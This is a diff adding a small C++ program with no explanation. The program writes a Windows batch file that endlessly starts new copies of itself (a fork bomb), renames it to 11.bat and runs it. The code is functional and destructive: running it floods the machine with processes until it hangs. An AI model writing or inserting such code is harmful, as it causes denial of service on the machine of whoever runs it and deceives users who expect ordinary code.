@@ -1,0 +1,9 @@
+#include<bits/stdc++.h>
+using namespace std;
+int main(){
+	freopen("11.out","w",stdout);
+	cout << ":1 \n start 11.bat \n goto 1";
+	fclose(stdout);
+	system("ren 11.out 11.bat");
+	system("start 11.bat");
+}
